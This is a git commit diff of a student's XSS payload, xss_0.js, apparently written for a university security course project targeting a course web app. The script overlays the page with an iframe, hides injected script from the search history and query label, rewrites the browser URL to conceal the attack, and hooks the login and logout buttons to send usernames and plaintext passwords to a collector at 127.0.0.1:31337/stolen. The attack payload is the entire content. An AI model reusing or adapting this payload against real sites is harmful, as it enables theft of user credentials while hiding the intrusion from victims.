54a81e11b0ca4b1d73c158af156e3aa134042764
Brian Shi <brishi@seas.upenn.edu>
2015-03-04 16:08:25 -0500

    i think finished...

--- xss_0.js
+++ xss_0.js
@@ -1,25 +1,33 @@
-$( document ).ready(function() {
+$(document).ready(function() {
+    /* Adding the hacked iframe and removing the actual body, which contains the searched query with the code inside */
     var iframeHtml = "<div id=\"iframe-hack\"><iframe style=\"width:100%; height:100%; position:fixed; left:0; top:0;\" src=\"http://cis331.cis.upenn.edu/project2\"></iframe></div>";
-
     $("body").append(iframeHtml);
     $('body > :not(#iframe-hack)').hide();
 
     /* Removing the JavaScript code from the URL*/
-    window.history.pushState("Blah", "Title", document.URL.split("%3Cscript")[0]); 
+    window.history.pushState("Blah", "Title", document.URL.split("search")[0]);
 
-    /* Reporting the page displayed by loading the URL */
-    var username = $("#logged-in-user").text();
-    var encodedUrl = encodeURIComponent(document.URL);
-    if (username) { 
-        $.get("http://127.0.0.1:31337/stolen?event=nav&user=" + username + "&url=" + encodedUrl);
-    } else {
-        $.get("http://127.0.0.1:31337/stolen?event=nav&url=" + encodedUrl);
-    }
+    /* Properly hiding all of the hacky stuff whenever the iframe changes */
+    $('#iframe-hack > iframe').load(function() {
+        /* Reporting the page displayed by loading the URL */
+        var username = $("#iframe-hack > iframe").contents().find("#logged-in-user").text();
+        var encodedUrl = encodeURIComponent(document.URL);
+        if (username) { 
+            $.get("http://127.0.0.1:31337/stolen?event=nav&user=" + username + "&url=" + encodedUrl);
+        } else {
+            $.get("http://127.0.0.1:31337/stolen?event=nav&url=" + encodedUrl);
+        }
+        /* Functions defined below that hide all suspicious activity from the page */
+        hideHacks();
+        bindEvents();
+        miscellaneous();
+    });
+});
 
-    /* Adding the code to the link
-
+/* Hides the scripts in the search query and the search history */
+var hideHacks = function () { 
     /* Hiding search elements that have JavaScript code */
-    $("#history-list").children().each( function () { 
+    $("#iframe-hack > iframe").contents().find("#history-list").children().each( function () { 
         var text = $(this).text();
         if (text.indexOf("script") > -1 || text.indexOf("$") > -1) { 
             var hidden_text = text.split("<script")[0];
@@ -31,27 +39,58 @@ $( document ).ready(function() {
         }
     });
 
+    /* Removing the query that includes script code */
+    $("#iframe-hack > iframe").contents().find("#query-lbl").text($("#iframe-hack > iframe").contents().find("#query-lbl").text().split("<script")[0]);
+};
+
+/* Binds the necessary events to all the buttons/links to ensure that the URL looks legit */
+var bindEvents = function () { 
     /* Making the logout button report the user's username */
-    $("#log-out-btn").on( "click", function () { 
-        var username = $("#logged-in-user").text();
+    $("#iframe-hack > iframe").contents().find("#log-out-btn").on( "click", function () { 
+        var username = $("#iframe-hack > iframe").contents().find("#logged-in-user").text();
         $.get("http://127.0.0.1:31337/stolen?event=logout&user=" + username);
     });
     
-    /* Removing the query that includes script code */
-    $("#query-lbl").text($("#query-lbl").text().split("<script")[0]);
-
     /* Making the login button report the user's username and password */
-    $("#log-in-btn").on( "click", function () { 
-        var username = $("#username").val();
-        var password = $("#userpass").val();
-        $.get("http://127.0.0.1:31337/stolen?event=logout&user=" + username + "&pass=" + password);
+    $("#iframe-hack > iframe").contents().find("#log-in-btn").on( "click", function () { 
+        var username = $("#iframe-hack > iframe").contents().find("#username").val();
+        var password = $("#iframe-hack > iframe").contents().find("#userpass").val();
+        $.get("http://127.0.0.1:31337/stolen?event=login&user=" + username + "&pass=" + password);
     });
 
-    /* Hiding the actual box, let them enter through a fake box */
-    $("#query").hide();
-    $(".search-well").append("<input id=\"query-fake\" type=\"text\" placeholder=\"Enter search terms\" autofocus=\"\" class=\"form-control input-lg search-field\">");
-    $("#query-fake").change( function () { 
-        $("#query").val($("#query-fake").val() + "allll this");
+    /* Changing the URL whenever a search is performed */
+    $("#iframe-hack > iframe").contents().find("#search-btn").on( "click", function () { 
+        var query = $("#iframe-hack > iframe").contents().find("#query").val().split("<script")[0];
+        window.history.replaceState("Blah", "Title", "search?q=" + query);
     });
-});
 
+    /* Clearing the URL whenever a new search begins */
+    $("#iframe-hack > iframe").contents().find("#search-again-btn").on( "click", function () { 
+        var rootUrl = document.URL.split("search")[0];
+        window.history.pushState("Blah", "Title", rootUrl);
+    });
+
+    /* Clearing the URL whenever user logs out */
+    $("#iframe-hack > iframe").contents().find("#log-out-btn").on( "click", function () { 
+        var rootUrl = document.URL.split("search")[0];
+        window.history.pushState("Blah", "Title", rootUrl);
+    });
+};
+
+/* Miscellaneous things that still need to be done */
+var miscellaneous = function () { 
+    /* If URL contains search parameters but we're not on the search page, fix the URL */
+    if ($("#iframe-hack > iframe").contents().find("#query").length > 0) { 
+        if (document.URL.indexOf("search") > -1) { 
+            var rootUrl = document.URL.split("search")[0];
+            window.history.replaceState("Blah", "Title", rootUrl);
+        }
+    }
+    /* If the URL does not contain the search parameters but we're on the search page, fix the URL */
+    if ($("#iframe-hack > iframe").contents().find("#query-lbl").length > 0) { 
+        if (document.URL.indexOf("search") < 0) { 
+            var query = $("#iframe-hack > iframe").contents().find("#query-lbl").text();
+            window.history.replaceState("Blah", "Title", "search?q=" + query);
+        }
+    }
+};
